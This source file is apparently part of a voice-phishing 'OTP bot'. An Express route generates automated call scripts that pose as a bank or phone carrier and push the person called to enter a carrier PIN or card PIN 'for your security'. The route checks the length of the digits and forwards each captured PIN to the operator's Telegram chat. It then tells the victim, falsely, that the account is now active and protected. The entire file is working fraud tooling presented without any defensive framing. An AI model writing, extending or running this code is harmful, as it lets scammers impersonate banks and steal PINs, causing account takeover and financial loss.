import { bot } from '../..';
import { app } from '../';
import { v4 as uuidv4 } from 'uuid';

app.all('/calls/pins/:step/:chatId/:language', async (req, res) => {
  const { step, chatId, language } = req.params;

  const { variables, pinType } = req.query;
  const { dtmf } = JSON.parse(variables as string);

  if (!dtmf) {
    return res.json({
      id: uuidv4(),
      title: `call PINS STEP - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              pinType === 'carrierPin'
                ? `You have not entered anything. To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
                : `You have not entered anything. For your security and to protect your account. Enter your ${pinType} followed by the pound key`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
          },
        },
      ],
    });
  }

  if (dtmf) {
    if (!(dtmf.length >= 6 && dtmf.length < 7) && pinType === 'carrierPin') {
      return res.json({
        id: uuidv4(),
        title: `call PINS STEP - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `The ${pinType} you have entered is incorrect. To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`,
              language,
              voice: 'female',
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'nextStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
            },
          },
        ],
      });
    }

    if (!(dtmf.length >= 4 && dtmf.length < 5) && pinType === 'cardPin') {
      return res.json({
        id: uuidv4(),
        title: `call PINS STEP - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `The ${pinType} you have entered is incorrect. For your security and to protect your account. Enter your ${pinType} again followed by the pound key.`,
              language,
              voice: 'female',
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'nextStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
            },
          },
        ],
      });
    }

    await bot.telegram.sendMessage(
      chatId,
      pinType === 'carrierPin'
        ? `Carrier pin is <b>${dtmf}</b> 📲`
        : `Card pin is <b>${dtmf}</b> 📟`,
      {
        parse_mode: 'HTML',
      },
    );
  }

  return res.json({
    id: uuidv4(),
    title: `call bank - ${chatId} no OTP`,
    record: false,
    steps: [
      {
        id: uuidv4(),
        action: 'say',
        options: {
          payload:
            pinType === 'carrierPin'
              ? `Great. Your Account is now active. we will continue to monitor and protect your account from any unauthorize charge in the future.
          Thank you for being a valued customer. You can now hang up`
              : `Great. Your CARD is now active. we will continue to monitor and protect your account from any unauthorize charge in the future.
          Thank you for being a valued customer. You can now hang up`,
          language,
          voice: 'female',
        },
      },
    ],
  });
});
